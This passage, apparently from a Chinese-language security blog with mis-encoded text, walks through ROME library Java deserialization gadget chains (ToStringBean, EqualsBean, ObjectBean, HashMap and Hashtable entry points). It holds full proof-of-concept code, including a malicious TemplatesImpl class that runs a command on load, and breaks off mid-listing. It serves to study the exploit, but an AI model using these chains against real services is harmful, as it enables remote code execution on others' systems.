HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p>å…¶å®è¿™é‡Œä¸»è¦çš„æ¼æ´ç‚¹æ˜¯åœ¨ToStringBean.toString()è¿™é‡Œæ¥çœ‹ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735223607844-e6444f41-5524-46db-828d-fe9aa80c46ad.png"></p><p>è¿™ä¸ªæ–¹æ³•å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„getteræ–¹æ³•ï¼Œä¸»è¦æ˜¯åœ¨getPropertyDescriptorsæ–¹æ³•ä¸­çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735223678450-2ffce0a8-7979-4ca9-acae-c271b8ac4544.png"></p><p>è¿™ä¸ªæ–¹æ³•ä¸­å­˜åœ¨ä¸€ä¸ªgetPDsæ–¹æ³•è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735223716657-de929ecc-2163-4a11-b4cd-7eb028e75102.png"></p><p>å°±æ˜¯è·å¾— class çš„ getter å’Œ setter æ–¹æ³•ã€‚ç„¶åå›åˆ°ä¸Šé¢çš„ <code>**getPropertyDescriptors**</code> æ–¹æ³•ï¼Œåœ¨è·å¾— getter å’Œ setter æ–¹æ³•åè°ƒç”¨äº† <code>**_introspected.put**</code> å¤„ç†ã€‚<code>**_introspected**</code> å°±æ˜¯ä¸Šé¢çš„ hashmap å¯¹è±¡ã€‚æ„æ€å°±æ˜¯è°ƒç”¨äº† hashmap çš„ put æ–¹æ³•æŠŠæ–¹æ³•å­˜è¿›äº† map ä¸­ï¼Œç„¶ååœ¨ ToStringBean. toString è¿›è¡Œéå† map ã€‚</p><p>æ‰€ä»¥å…¶å®è¿™é‡Œçš„åˆ©ç”¨å°±å¾ˆæ˜¾è€Œæ˜“è§äº†å°±å¯ä»¥ç›´æ¥ç»“åˆtemplatesé“¾è¿›è¡Œåˆ©ç”¨åŠ è½½æ¶æ„çš„å­—èŠ‚ç äº†ã€‚è¿™é‡Œçœ‹ä¸€ä¸‹è¯¥ç±»çš„æ„é€ æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735223893196-eb197b67-2fcf-4b9f-99ad-75caee555ce6.png"></p><p>å…¶ä¸­<code>_beanClass</code>ä¸ºJavaBeanç±»å‹çš„classï¼Œ<code>_obj</code>ä¸ºè¦è°ƒç”¨çš„å®ä¾‹å¯¹è±¡ï¼Œè¿™é‡Œè¦ä¼ å…¥çš„å½“ç„¶å°±æ˜¯è¦åˆ©ç”¨çš„<code>TemplatesImpl</code>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æ‰‹åŠ¨è°ƒç”¨ä¸€ä¸‹toStringæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        toStringBean.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ˜¯å¯ä»¥æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨çš„ã€‚</p><p>ç°åœ¨å°±æ˜¯è¦æ‰¾å‰åŠéƒ¨åˆ†çš„æ„é€ é“¾äº†ï¼Œç°åœ¨å°±æ˜¯è¦æ‰¾åˆ°ä¸€ä¸ªèƒ½å¤Ÿè°ƒç”¨toStringæ–¹æ³•çš„ç±»å¹¶ä¸”å¯æ§ï¼Œåœ¨ROMEä¸­å­˜åœ¨ç€EqualsBeanç±»çš„beanHashCodeæ–¹æ³•å­˜åœ¨ç€èƒ½å¤Ÿè°ƒç”¨toStringæ–¹æ³•ï¼Œå¹¶ä¸”objå¯æ§</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735224481502-bafa30f2-6837-483d-a9de-037c10ecf561.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735224563537-320aec49-f0cc-4e1e-82b0-af03aa171350.png"></p><p>æ‰€ä»¥æ¥ä¸‹é‡Œè¦æ‰¾è°è°ƒç”¨äº†beanHashCodeæ–¹æ³•ï¼Œå¯ä»¥æ‰¾æ‰“åœ¨åŒç±»ä¸‹å­˜åœ¨ä¸€ä¸ªhashcodeæ–¹æ³•è°ƒç”¨äº†è¯¥æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735224606109-02507cdd-c449-4e61-a4aa-573abfaee5b7.png"></p><p>å†å»æ‰¾hashcodeçš„è°ƒç”¨å¾ˆå®¹æ˜“å¯ä»¥æƒ³åˆ°hashmapå¯ä»¥è°ƒç”¨åˆ°hashcodeæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735224187972-c460f451-08ca-4c41-9e00-96fa1fffa5f4.png"></p><p>hashmapçš„readObjectæ–¹æ³•ä¸­æ˜¯èƒ½å¤Ÿè°ƒç”¨åˆ°hashæ–¹æ³•çš„ç„¶ååœ¨çœ‹çœ‹hashæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735224233726-1346e642-a08b-417c-8b6e-b8fdce1ef430.png"></p><p>è¿™é‡Œkeyä¼šè°ƒç”¨hashcodeæ–¹æ³•ã€‚æ‰€ä»¥åˆ°æ­¤æ•´ä¸ªæµç¨‹å°±æ¯”è¾ƒæ˜äº†äº†å¯ä»¥ç›´æ¥å†™POCäº†</p><h2 id="hashmap-TemplatesImplåˆ©ç”¨é“¾"><a href="#hashmap-TemplatesImplåˆ©ç”¨é“¾" class="headerlink" title="hashmap+TemplatesImplåˆ©ç”¨é“¾"></a>hashmap+TemplatesImplåˆ©ç”¨é“¾</h2><p>è‡ªå·±æ„é€ çš„æ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æ˜¯è¦è®°å¾—ä¸è¦å«æœ‰åŒ…åè¦ä¸ç„¶ç¼–è¯‘çš„æ—¶å€™å¯èƒ½ä¼šæŠ¥é”™</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735222928820-b115ee34-2ae4-4770-a83f-6b35cd534147.png"></p><p>æ”¾åˆ°javaç›®å½•ä¸‹å°±å¯ä»¥äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_EqualsBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Serialize(hashMap);</span></span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å‡ ç§ROMEåˆ©ç”¨é“¾çš„ååŠæ®µè¾ƒä¸ºå›ºå®šï¼Œéƒ½æ˜¯ä½¿ç”¨<code>TemplatesImpl.getOutputProperties()</code>è¿›è¡Œä»»æ„ç±»åŠ è½½ï¼Œæ‰€ä»¥è¿™é‡Œçš„å…¶ä»–åˆ©ç”¨é“¾éƒ½æ˜¯é’ˆå¯¹å‰åŠæ®µå…¥å£å¤„è¿›è¡Œæ›¿æ¢çš„ã€‚</p><h2 id="ObjectBeanåˆ©ç”¨"><a href="#ObjectBeanåˆ©ç”¨" class="headerlink" title="ObjectBeanåˆ©ç”¨"></a>ObjectBeanåˆ©ç”¨</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735226296723-bc90fdf1-110f-4835-b26f-5d5f729601b9.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735226313426-67c96871-1009-454c-8897-f66b902fcff8.png"></p><p>å¯ä»¥çœ‹åˆ°ObjectBeanä¹Ÿå­˜åœ¨hashcodeæ–¹æ³•å¹¶ä¸”ä¹Ÿè°ƒç”¨äº†beanHashcodeæ–¹æ³•ï¼Œå¹¶ä¸”ä¹Ÿéƒ½å¯æ§æ‰€ä»¥åªéœ€è¦å°†</p><p>EqualsBeanæ¢æˆObjectBeanå³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Remote_ObjectBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Serialize(hashMap);</span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="HashTableåˆ©ç”¨é“¾"><a href="#HashTableåˆ©ç”¨é“¾" class="headerlink" title="HashTableåˆ©ç”¨é“¾"></a>HashTableåˆ©ç”¨é“¾</h2><p>HashTableåˆ©ç”¨é“¾åªæ˜¯æ›´æ¢äº†HashMapå…¥å£ç±»è€Œå·²å…¶ä»–çš„æµç¨‹è¿˜æ˜¯ä¸å˜ï¼Œçœ‹ä¸€ä¸‹HashTableçš„å…¥å£ç‚¹<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735226700498-21fd1c8b-6468-4ad6-9b11-9c44b4a9c83f.png"></p><p>å¯ä»¥çœ‹åˆ°ä¼šè°ƒç”¨reconstitutionPutæ–¹æ³•è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735226743360-c0682c79-5f87-4572-b6fe-3aa8894b1a22.png"></p><p>å¯ä»¥çœ‹åˆ°ä¼šè°ƒç”¨hashcodeæ–¹æ³•æ‰€ä»¥åé¢å°±å¾ˆæ˜äº†äº†ï¼Œå¯ä»¥å°†HashTableæ›¿æ¢ä¸ºHashMapé›†åˆEualsBeanå’ŒObjectBeanè¿›è¡Œåˆ©ç”¨</p><h3 id="HashTbale-ObjectBean"><a href="#HashTbale-ObjectBean" class="headerlink" title="HashTbale+ObjectBean"></a>HashTbale+ObjectBean</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Remo_HashTable_ObjectBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title 